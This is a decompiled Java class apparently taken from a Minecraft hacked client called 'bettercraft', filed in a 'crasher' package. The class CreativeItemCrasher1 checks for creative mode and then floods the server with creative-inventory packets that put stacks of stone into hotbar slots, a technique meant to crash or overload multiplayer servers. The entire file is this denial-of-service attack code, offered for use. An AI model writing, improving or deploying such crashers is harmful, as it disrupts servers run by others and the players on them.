// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.cic;

import net.minecraft.client.entity.EntityPlayerSP;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Blocks;
import net.minecraft.client.Minecraft;

public class CreativeItemCrasher1
{
    public static double packets;
    
    static {
        CreativeItemCrasher1.packets = 10.0;
    }
    
    public static void start() {
        final EntityPlayerSP player = Minecraft.getMinecraft().player;
        if (player.capabilities.isCreativeMode) {
            for (int j = 0; j < CreativeItemCrasher1.packets; ++j) {
                Minecraft.getMinecraft().player.connection.sendPacket(new CPacketCreativeInventoryAction(j % 9 + 1, new ItemStack(Blocks.STONE, 64)));
            }
        }
    }
}
